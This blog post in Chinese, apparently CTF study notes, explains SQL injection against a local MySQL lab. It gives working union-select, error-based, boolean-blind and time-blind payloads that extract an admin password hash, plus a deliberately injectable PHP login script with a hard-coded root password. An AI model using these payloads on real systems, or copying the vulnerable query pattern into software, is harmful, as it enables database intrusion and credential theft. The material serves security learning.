<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT">










<meta name="description" content="前言sql注入的知识学习总结 0x01 基础知识……0x02 查1.有回显对于一个web应用来说就是当我们根据某个字段查询数据时，该字段查询返回的结果显示在页面中；对于数据库来说就是查询的u_id(自己定义的一个字段)这样一个字段返回的结果，例如：1234567mysql&amp;gt; select username,password from users where u_id=&amp;apos;4411&amp;a">
<meta property="og:type" content="article">
<meta property="og:title" content="sql注入篇">
<meta property="og:url" content="http://yoursite.com/2021/01/30/sql注入篇/index.html">
<meta property="og:site_name" content="L&#39;s Blog">
<meta property="og:description" content="前言sql注入的知识学习总结 0x01 基础知识……0x02 查1.有回显对于一个web应用来说就是当我们根据某个字段查询数据时，该字段查询返回的结果显示在页面中；对于数据库来说就是查询的u_id(自己定义的一个字段)这样一个字段返回的结果，例如：1234567mysql&amp;gt; select username,password from users where u_id=&amp;apos;4411&amp;a">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/sql-1.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/sql-2.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/sql-3.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/sql-4.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/sql-5.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/sql-6.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/sql-7.jpg">
<meta property="og:updated_time" content="2021-01-30T08:09:35.138Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="sql注入篇">
<meta name="twitter:description" content="前言sql注入的知识学习总结 0x01 基础知识……0x02 查1.有回显对于一个web应用来说就是当我们根据某个字段查询数据时，该字段查询返回的结果显示在页面中；对于数据库来说就是查询的u_id(自己定义的一个字段)这样一个字段返回的结果，例如：1234567mysql&amp;gt; select username,password from users where u_id=&amp;apos;4411&amp;a">
<meta name="twitter:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/sql-1.jpg">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2021/01/30/sql注入篇/">





  <title>sql注入篇 | L's Blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">L's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">share with you</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/01/30/sql注入篇/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Ljdd520">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="L's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">sql注入篇</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-01-30T15:14:47+08:00">
                2021-01-30
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/ctf学习之路/" itemprop="url" rel="index">
                    <span itemprop="name">ctf学习之路</span>
                  </a>
                </span>

                
                
                  ， 
                
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/ctf学习之路/sql/" itemprop="url" rel="index">
                    <span itemprop="name">sql</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  15.5k
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  67
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>sql注入的知识学习总结</p>
<h4 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01 基础知识"></a>0x01 基础知识</h4><h6 id="……"><a href="#……" class="headerlink" title="……"></a>……</h6><h4 id="0x02-查"><a href="#0x02-查" class="headerlink" title="0x02 查"></a>0x02 查</h4><h5 id="1-有回显"><a href="#1-有回显" class="headerlink" title="1.有回显"></a>1.有回显</h5><h6 id="对于一个web应用来说就是当我们根据某个字段查询数据时，该字段查询返回的结果显示在页面中；对于数据库来说就是查询的u-id-自己定义的一个字段-这样一个字段返回的结果，例如："><a href="#对于一个web应用来说就是当我们根据某个字段查询数据时，该字段查询返回的结果显示在页面中；对于数据库来说就是查询的u-id-自己定义的一个字段-这样一个字段返回的结果，例如：" class="headerlink" title="对于一个web应用来说就是当我们根据某个字段查询数据时，该字段查询返回的结果显示在页面中；对于数据库来说就是查询的u_id(自己定义的一个字段)这样一个字段返回的结果，例如："></a>对于一个web应用来说就是当我们根据某个字段查询数据时，该字段查询返回的结果显示在页面中；对于数据库来说就是查询的<code>u_id</code>(自己定义的一个字段)这样一个字段返回的结果，例如：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username,password from users where u_id=&apos;4411&apos;;</span><br><span class="line">+----------+----------+</span><br><span class="line">| username | password |</span><br><span class="line">+----------+----------+</span><br><span class="line">| user1    | 123      |</span><br><span class="line">+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h6 id="对于上面的回显我们一般用union-select的组合来进行注入，例如："><a href="#对于上面的回显我们一般用union-select的组合来进行注入，例如：" class="headerlink" title="对于上面的回显我们一般用union+select的组合来进行注入，例如："></a>对于上面的回显我们一般用<code>union+select</code>的组合来进行注入，例如：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username,password from users where u_id=&apos;4411&apos; union select user(),database();</span><br><span class="line">+----------------+-----------+</span><br><span class="line">| username       | password  |</span><br><span class="line">+----------------+-----------+</span><br><span class="line">| user1          | 123       |</span><br><span class="line">| root@localhost | shopping1 |</span><br><span class="line">+----------------+-----------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h6 id="PS-注意："><a href="#PS-注意：" class="headerlink" title="PS 注意："></a>PS 注意：</h6><ul>
<li>若回显只能是一条数据，那么我们需要让前面的正常查询的结果为空(或者用<code>limit x,x</code>来选出我们需要的数据返回)。</li>
<li>当使用<code>union select</code>进行拼接查询时，我们需要让前后两个<code>select</code>语句返回的字段数相同，否则会执行错误。</li>
</ul>
<h5 id="2-无回显"><a href="#2-无回显" class="headerlink" title="2.无回显"></a>2.无回显</h5><h6 id="示例代码："><a href="#示例代码：" class="headerlink" title="示例代码："></a>示例代码：</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$servername=<span class="string">"127.0.0.1"</span>;</span><br><span class="line">$username=<span class="string">"root"</span>;</span><br><span class="line">$password=<span class="string">"ljdd520"</span>;</span><br><span class="line">$dbname=<span class="string">"shopping1"</span>;</span><br><span class="line"></span><br><span class="line">$conn = mysqli_connect($servername, $username, $password, $dbname);</span><br><span class="line"><span class="keyword">if</span> (!$conn) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Connection failed: "</span> . mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line">$username = @$_POST[<span class="string">'username'</span>];</span><br><span class="line">$password = @$_POST[<span class="string">'password'</span>];</span><br><span class="line">$sql = <span class="string">"select * from users where username = '$username' and password='$password';"</span>;</span><br><span class="line">$rs = mysqli_query($conn,$sql);</span><br><span class="line"><span class="keyword">if</span>($rs-&gt;fetch_row())&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"success"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"fail"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="对于一个web应用来说就是当sql语句执行成功时返回一个标志，执行失败时返回另一个标志-例如：上面的代码模拟了一个应用的登陆处理，成功时返回success，失败时返回fail-，但是这个返回的标志不是sql语句执行的结果，通常遇到这种无回显的注入我们用报错注入和盲注。"><a href="#对于一个web应用来说就是当sql语句执行成功时返回一个标志，执行失败时返回另一个标志-例如：上面的代码模拟了一个应用的登陆处理，成功时返回success，失败时返回fail-，但是这个返回的标志不是sql语句执行的结果，通常遇到这种无回显的注入我们用报错注入和盲注。" class="headerlink" title="对于一个web应用来说就是当sql语句执行成功时返回一个标志，执行失败时返回另一个标志(例如：上面的代码模拟了一个应用的登陆处理，成功时返回success，失败时返回fail)，但是这个返回的标志不是sql语句执行的结果，通常遇到这种无回显的注入我们用报错注入和盲注。"></a>对于一个web应用来说就是当<code>sql</code>语句执行成功时返回一个标志，执行失败时返回另一个标志(例如：上面的代码模拟了一个应用的登陆处理，成功时返回<code>success</code>，失败时返回<code>fail</code>)，但是这个返回的标志不是sql语句执行的结果，通常遇到这种<code>无回显</code>的注入我们用<code>报错注入和盲注</code>。</h6><h6 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a><code>报错注入</code></h6><h6 id="报错注入就是有些函数会将其参数的结果包含在其报错信息中，通常我们利用这一个特性在其参数中放入我们想要得到的数据，一般使用子查询的方式实现，然后使其报错得到信息，例如"><a href="#报错注入就是有些函数会将其参数的结果包含在其报错信息中，通常我们利用这一个特性在其参数中放入我们想要得到的数据，一般使用子查询的方式实现，然后使其报错得到信息，例如" class="headerlink" title="报错注入就是有些函数会将其参数的结果包含在其报错信息中，通常我们利用这一个特性在其参数中放入我们想要得到的数据，一般使用子查询的方式实现，然后使其报错得到信息，例如:"></a>报错注入就是有些函数会将其参数的结果包含在其报错信息中，通常我们利用这一个特性在其参数中放入我们想要得到的数据，一般使用子查询的方式实现，然后使其报错得到信息，例如:</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username,password from users where u_id=&apos;4411&apos; and updatexml(1,concat(0x7e,(select user()),0x7e),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;~root@localhost~&apos;</span><br><span class="line"></span><br><span class="line">mysql&gt; select username,password from users where u_id=&apos;4411&apos; and exp(~(select*from(select user())x));</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &apos;exp(~((select `x`.`user()` from (select user() AS `user()`) `x`)))&apos;</span><br></pre></td></tr></table></figure>

<h6 id="上面的exp没有报错出我们user-的数据可能是我mysql的原因-我的版本mysql-8-0-18-。"><a href="#上面的exp没有报错出我们user-的数据可能是我mysql的原因-我的版本mysql-8-0-18-。" class="headerlink" title="上面的exp没有报错出我们user()的数据可能是我mysql的原因(我的版本mysql-8.0.18)。"></a>上面的<code>exp</code>没有报错出我们<code>user()</code>的数据可能是我mysql的原因(我的版本<code>mysql-8.0.18</code>)。</h6><h6 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a><code>盲注</code></h6><h6 id="如果web应用设置了不能纰漏报错的数据，而且不能直接返回sql的执行结果，那么盲注就成了唯一的选择，盲注也有两种方式时间盲注和bool盲注。"><a href="#如果web应用设置了不能纰漏报错的数据，而且不能直接返回sql的执行结果，那么盲注就成了唯一的选择，盲注也有两种方式时间盲注和bool盲注。" class="headerlink" title="如果web应用设置了不能纰漏报错的数据，而且不能直接返回sql的执行结果，那么盲注就成了唯一的选择，盲注也有两种方式时间盲注和bool盲注。"></a>如果web应用设置了不能纰漏报错的数据，而且不能直接返回<code>sql</code>的执行结果，那么盲注就成了唯一的选择，盲注也有两种方式<code>时间盲注</code>和<code>bool盲注</code>。</h6><h6 id="bool盲注"><a href="#bool盲注" class="headerlink" title="bool盲注"></a><code>bool盲注</code></h6><h6 id="名如其曰就是通过对真假条件的判断-真假条件返回的内容要容易区分-来进行注入的方式。"><a href="#名如其曰就是通过对真假条件的判断-真假条件返回的内容要容易区分-来进行注入的方式。" class="headerlink" title="名如其曰就是通过对真假条件的判断(真假条件返回的内容要容易区分)来进行注入的方式。"></a>名如其曰就是通过对<code>真假条件的判断</code>(真假条件返回的内容要容易区分)来进行注入的方式。</h6><h6 id="例如，我们正常的sql语句是select-username-password-from-users-where-u-id-39-4411-39-，我们都知道where的后面是条件那么我们在加一个条件对比一下："><a href="#例如，我们正常的sql语句是select-username-password-from-users-where-u-id-39-4411-39-，我们都知道where的后面是条件那么我们在加一个条件对比一下：" class="headerlink" title="例如，我们正常的sql语句是select username,password from users where u_id=&#39;4411&#39;;，我们都知道where的后面是条件那么我们在加一个条件对比一下："></a>例如，我们正常的sql语句是<code>select username,password from users where u_id=&#39;4411&#39;;</code>，我们都知道where的后面是条件那么我们在加一个条件对比一下：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username,password from users where u_id=&apos;4411&apos;;</span><br><span class="line">+----------+----------+</span><br><span class="line">| username | password |</span><br><span class="line">+----------+----------+</span><br><span class="line">| user1    | 123      |</span><br><span class="line">+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select username,password from users where u_id=&apos;4411&apos; and 1=2;</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select username,password from users where u_id=&apos;4411&apos; and 1=1;</span><br><span class="line">+----------+----------+</span><br><span class="line">| username | password |</span><br><span class="line">+----------+----------+</span><br><span class="line">| user1    | 123      |</span><br><span class="line">+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h6 id="可以看到当where后面的条件为假时，返回的结果空，如果真假条件返回的内容在页面上容易区分的话我们可以使用bool盲注。"><a href="#可以看到当where后面的条件为假时，返回的结果空，如果真假条件返回的内容在页面上容易区分的话我们可以使用bool盲注。" class="headerlink" title="可以看到当where后面的条件为假时，返回的结果空，如果真假条件返回的内容在页面上容易区分的话我们可以使用bool盲注。"></a>可以看到当where后面的条件为<code>假</code>时，返回的结果空，如果真假条件返回的内容在页面上容易区分的话我们可以使用<code>bool盲注</code>。</h6><h6 id="例句：-where-and-or-amp-amp-if-substr-select-password-from-users-where-username-39-admin-39-1-1-39-a-39-1-0-1-0-。"><a href="#例句：-where-and-or-amp-amp-if-substr-select-password-from-users-where-username-39-admin-39-1-1-39-a-39-1-0-1-0-。" class="headerlink" title="例句：(where | and | or| || | &amp;&amp; | ^) if(substr((select password from users where username=&#39;admin&#39;),1,1)=&#39;a&#39;,1,0)(^1 | ^0);。"></a>例句：<code>(where | and | or| || | &amp;&amp; | ^) if(substr((select password from users where username=&#39;admin&#39;),1,1)=&#39;a&#39;,1,0)(^1 | ^0);</code>。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username,password from users where u_id=&apos;4411&apos; and if(substr((select password from users where username=&apos;admin&apos;),1,1)=&apos;1&apos;,1,0);</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select username,password from users where u_id=&apos;4411&apos; and if(substr((select password from users where username=&apos;admin&apos;),1,1)=&apos;2&apos;,1,0);</span><br><span class="line">+----------+----------+</span><br><span class="line">| username | password |</span><br><span class="line">+----------+----------+</span><br><span class="line">| user1    | 123      |</span><br><span class="line">+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select *from users;</span><br><span class="line">+------+----------+----------------------------------+-------+------------+---------+</span><br><span class="line">| u_id | username | password                         | phone | email      | address |</span><br><span class="line">+------+----------+----------------------------------+-------+------------+---------+</span><br><span class="line">| 4411 | user1    | 123                              | 124   | 123@qq.com | 123     |</span><br><span class="line">| 4412 | user2    | 456                              | 568   | 456@qq.com | 456     |</span><br><span class="line">| 4413 | admin    | 21232f297a57a5a743894a0e4a801fc3 | 789   | 789@qq.com | 789     |</span><br><span class="line">+------+----------+----------------------------------+-------+------------+---------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select username,password from users where u_id=&apos;4411&apos;^if(substr((select password from users where username=&apos;admin&apos;),1,1)=&apos;1&apos;,1,0)^1;</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select username,password from users where u_id=&apos;4411&apos;^if(substr((select password from users where username=&apos;admin&apos;),1,1)=&apos;2&apos;,1,0)^1;</span><br><span class="line">+----------+----------+</span><br><span class="line">| username | password |</span><br><span class="line">+----------+----------+</span><br><span class="line">| user1    | 123      |</span><br><span class="line">+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h6 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a><code>时间盲注</code></h6><h6 id="对于时间盲注而言是通过页面返回的延迟的时间来判断条件是否正确。简单来说就是我们自定义的条件为假的时候，我们设置延迟时间为0，如果条件为真，使用benchmark和sleep等函数，让sql语句执行产生延迟，例如："><a href="#对于时间盲注而言是通过页面返回的延迟的时间来判断条件是否正确。简单来说就是我们自定义的条件为假的时候，我们设置延迟时间为0，如果条件为真，使用benchmark和sleep等函数，让sql语句执行产生延迟，例如：" class="headerlink" title="对于时间盲注而言是通过页面返回的延迟的时间来判断条件是否正确。简单来说就是我们自定义的条件为假的时候，我们设置延迟时间为0，如果条件为真，使用benchmark和sleep等函数，让sql语句执行产生延迟，例如："></a>对于时间盲注而言是通过<code>页面返回的延迟的时间</code>来判断条件是否正确。简单来说就是我们自定义的条件为假的时候，我们设置延迟时间为<code>0</code>，如果条件为真，使用<code>benchmark</code>和<code>sleep</code>等函数，让sql语句执行产生延迟，例如：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username,password from users where u_id=&apos;4413&apos; and if(0,sleep(3),1);</span><br><span class="line">+----------+----------------------------------+</span><br><span class="line">| username | password                         |</span><br><span class="line">+----------+----------------------------------+</span><br><span class="line">| admin    | 21232f297a57a5a743894a0e4a801fc3 |</span><br><span class="line">+----------+----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select username,password from users where u_id=&apos;4413&apos; and if(1,sleep(3),1);</span><br><span class="line">Empty set (3.00 sec)</span><br></pre></td></tr></table></figure>

<h6 id="例句：-and-other-if-substr-select-password-from-users-where-username-39-admin-39-1-1-39-a-39-sleep-3-1"><a href="#例句：-and-other-if-substr-select-password-from-users-where-username-39-admin-39-1-1-39-a-39-sleep-3-1" class="headerlink" title="例句：(and | other) if(substr((select password from users where username=&#39;admin&#39;),1,1)=&#39;a&#39;,sleep(3),1);"></a>例句：<code>(and | other) if(substr((select password from users where username=&#39;admin&#39;),1,1)=&#39;a&#39;,sleep(3),1);</code></h6><h6 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h6><h6 id="常见注入方法有三种：联合查询注入，报错注入，盲注，其中："><a href="#常见注入方法有三种：联合查询注入，报错注入，盲注，其中：" class="headerlink" title="常见注入方法有三种：联合查询注入，报错注入，盲注，其中："></a>常见注入方法有三种：<code>联合查询注入，报错注入，盲注</code>，其中：</h6><ul>
<li>有回显：<code>三种均可用</code>，推荐使用联合查询注入。</li>
<li>无回显：<code>报错注入+盲注</code>。</li>
</ul>
<h6 id="对于时间成本来说：联合查询注入-lt-报错注入-lt-lt-盲注。"><a href="#对于时间成本来说：联合查询注入-lt-报错注入-lt-lt-盲注。" class="headerlink" title="对于时间成本来说：联合查询注入&lt;报错注入&lt;&lt;盲注。"></a>对于时间成本来说：联合查询注入&lt;报错注入&lt;&lt;盲注。</h6><h6 id="通常情况下，盲注需要一个一个字符的进行判断。这极大的增加了时间成本，况且对于时间盲注来说，还需要额外的延迟时间来作为判断的标准。"><a href="#通常情况下，盲注需要一个一个字符的进行判断。这极大的增加了时间成本，况且对于时间盲注来说，还需要额外的延迟时间来作为判断的标准。" class="headerlink" title="通常情况下，盲注需要一个一个字符的进行判断。这极大的增加了时间成本，况且对于时间盲注来说，还需要额外的延迟时间来作为判断的标准。"></a>通常情况下，盲注需要一个一个字符的进行判断。这极大的增加了时间成本，况且对于时间盲注来说，还需要额外的延迟时间来作为判断的标准。</h6><h5 id="3-三大注入的基本步骤"><a href="#3-三大注入的基本步骤" class="headerlink" title="3.三大注入的基本步骤"></a>3.三大注入的基本步骤</h5><h6 id="联合查询注入步骤"><a href="#联合查询注入步骤" class="headerlink" title="联合查询注入步骤"></a><code>联合查询注入步骤</code></h6><h6 id="1）首先，先确定字段数量。"><a href="#1）首先，先确定字段数量。" class="headerlink" title="1）首先，先确定字段数量。"></a>1）首先，先确定字段数量。</h6><h6 id="使用order-group-by语句。通过往后拼接数字，可确定字段数量，若拼接字段数大于原字段数，则页面错误-无内容，若拼接的字段数小于-等于，则页面正常。若错误页与正常页一样，更换报错注入-盲注，例如："><a href="#使用order-group-by语句。通过往后拼接数字，可确定字段数量，若拼接字段数大于原字段数，则页面错误-无内容，若拼接的字段数小于-等于，则页面正常。若错误页与正常页一样，更换报错注入-盲注，例如：" class="headerlink" title="使用order/group by语句。通过往后拼接数字，可确定字段数量，若拼接字段数大于原字段数，则页面错误/无内容，若拼接的字段数小于/等于，则页面正常。若错误页与正常页一样，更换报错注入/盲注，例如："></a>使用<code>order/group by</code>语句。通过往后拼接数字，可确定字段数量，<code>若拼接字段数大于原字段数，则页面错误/无内容，若拼接的字段数小于/等于，则页面正常</code>。若错误页与正常页一样，更换<code>报错注入/盲注</code>，例如：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username,password from users where u_id=&apos;4413&apos; order by 1,2;</span><br><span class="line">+----------+----------------------------------+</span><br><span class="line">| username | password                         |</span><br><span class="line">+----------+----------------------------------+</span><br><span class="line">| admin    | 21232f297a57a5a743894a0e4a801fc3 |</span><br><span class="line">+----------+----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select username,password from users where u_id=&apos;4413&apos; order by 1;</span><br><span class="line">+----------+----------------------------------+</span><br><span class="line">| username | password                         |</span><br><span class="line">+----------+----------------------------------+</span><br><span class="line">| admin    | 21232f297a57a5a743894a0e4a801fc3 |</span><br><span class="line">+----------+----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select username,password from users where u_id=&apos;4413&apos; order by 1,2,3;</span><br><span class="line">ERROR 1054 (42S22): Unknown column &apos;3&apos; in &apos;order clause&apos;</span><br></pre></td></tr></table></figure>

